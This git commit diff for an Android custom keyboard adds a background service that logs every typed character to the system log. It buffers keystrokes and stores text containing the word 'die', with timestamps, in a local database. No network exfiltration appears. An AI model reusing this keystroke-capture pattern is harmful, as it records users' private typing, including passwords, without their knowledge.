d6caa0ddb6cd91f1c7acf05c736fe1c4e00f79e9
RitwickRaj78 <ritwickraj78@gmail.com>
2020-02-09 14:56:07 +0530

    Adding Buffer

--- keyboard/app/src/main/java/com/ritwick/keyboard/BackService.java
+++ keyboard/app/src/main/java/com/ritwick/keyboard/BackService.java
@@ -1,4 +1,3 @@
-
 package com.ritwick.keyboard;
 
 import android.app.Service;
@@ -9,23 +8,28 @@ import android.util.Log;
 
 public class BackService extends Service {
 
+    private StringBuffer sb = new StringBuffer();
     dbmaker db;
+    int c=1;
     @Override
     public void onCreate() {
         super.onCreate();
 
         Log.e("BACKGROUND","SERVICE CREATED");
-         db = new dbmaker(this);
+        db = new dbmaker(this);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
 
-        if(intent!=null)
-        {
-            Log.e("BACKGROUND"," "+ intent.getStringExtra("Character"));
+        if(intent!=null) {
+            String character = intent.getStringExtra("Character");
 
-            writeToSDFile((intent.getStringExtra("Character")));
+            Log.e("BACKGROUND"," "+ character);
+
+
+
+            writeToSDFile(character);
 
         }
         return START_STICKY;
@@ -37,22 +41,58 @@ public class BackService extends Service {
     }
 
     private void writeToSDFile(String data){
+        char a = data.charAt(0);
+        int asc = (int)a;
+        //Log.e("Ascii value",Integer.toString(asc));
+        if(asc==65531&&sb.length()>1){
+            sb.delete(sb.length()-2,sb.length()-1);
+        }
+        else if(asc!=65531){
+            if(sb.length()==20&&c>0) {
+                store();
+            }
+            else{
+                sb.append(data);
+            }
+        }
+        Cursor c = db.getData();
+        if(c.getCount()==0) {
+            Log.e("DATABASE","EMPTY");
+            return;
+        }
 
-
-    boolean done = db.insertdata(data);
-    if(done==true)
-        Log.e("VALUES DB","INSERTED");
-    else
-        Log.e("VALUES DB","FAAILED");
-    Cursor c = db.getData();
-    if(c.getCount()==0) {
-        Log.e("DATABASE","EMOPTY");
-        return;
+        int counter = 0;
+        while(c.moveToNext()){
+            Log.e("VALUES",c.getString(0));
+            if (++counter == 1)
+                break;
+        }
     }
-    while(c.moveToNext()){
-        Log.e("VALUES",c.getString(0));
-    }
 
+    public void store(){
+        String[] words = sb.toString().split("\\s");
+        for(String w : words){
+            //Log.e("WORDS",w);
+            if(w.equals("die")){
+                boolean done = db.insertData(sb.toString());
+                c= 5;
+                if (done)
+                    Log.e("VALUES DB", "INSERTED");
+                else
+                    Log.e("VALUES DB", "FAILED");
+                break;
+            }
+            else{
+                if(c>1){
+                    db.insertData(sb.toString());
+                    c--;
+                }
+                else
+                    c=1;
+            }
+
+        }
+        sb = new StringBuffer();
     }
 
 }
--- keyboard/app/src/main/java/com/ritwick/keyboard/dbmaker.java
+++ keyboard/app/src/main/java/com/ritwick/keyboard/dbmaker.java
@@ -8,11 +8,15 @@ import android.database.sqlite.SQLiteOpenHelper;
 
 import androidx.annotation.Nullable;
 
+import java.util.concurrent.TimeUnit;
+
 public  class dbmaker extends SQLiteOpenHelper {
 
-    public static final String DB_NAME = "data.db";
-    public static final String TABLE_NAME = "words";
-    public static final String COL_NAME = "chars";
+    private static final String DB_NAME = "data1.db";
+    private static final String TABLE_NAME = "Words";
+    private static final String COL_CHARS = "chars";
+    private static final String COL_PK = "id";
+    private static final String COL_TIMESTAMP = "timestamp";
 
     public dbmaker(@Nullable Context context) {
         super(context, DB_NAME, null, 1);
@@ -21,28 +25,34 @@ public  class dbmaker extends SQLiteOpenHelper {
 
     @Override
     public void onCreate(SQLiteDatabase db) {
-        db.execSQL("CREATE TABLE "+TABLE_NAME + "(chars VARCHAR)");
+        String createQuery = String.format("CREATE TABLE %s (%s INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, %s TEXT NOT NULL, %s TEXT);",
+                TABLE_NAME, COL_PK, COL_TIMESTAMP, COL_CHARS);
+        db.execSQL(createQuery);
     }
 
     @Override
     public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
-        db.execSQL("DROP TABLE IF EXISTS "+TABLE_NAME);
+        String dropTableQuery = String.format("DROP TABLE IF EXISTS %s", TABLE_NAME);
+        db.execSQL(dropTableQuery);
         onCreate(db);
     }
 
-    public boolean insertdata(String s){
+    public boolean insertData(String s){
         SQLiteDatabase db = this.getWritableDatabase();
+
         ContentValues contentValues = new ContentValues();
-        contentValues.put(COL_NAME,s);
+        String ts = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+        contentValues.put(COL_TIMESTAMP, ts);
+        contentValues.put(COL_CHARS, s);
+
         long result = db.insert(TABLE_NAME,null,contentValues);
-        if(result==-1)
-            return false;
-        else
-            return true;
+        return result != -1;
     }
-    public Cursor getData(){
+    public Cursor getData() {
+        String getQuery = String.format("SELECT %s FROM %s ORDER BY %s DESC;",
+                COL_CHARS, TABLE_NAME, COL_TIMESTAMP);
+
         SQLiteDatabase db = this.getWritableDatabase();
-        Cursor c =db.rawQuery("SELECT * FROM "+ TABLE_NAME,null);
-        return c;
+        return  db.rawQuery(getQuery,null);
     }
 }
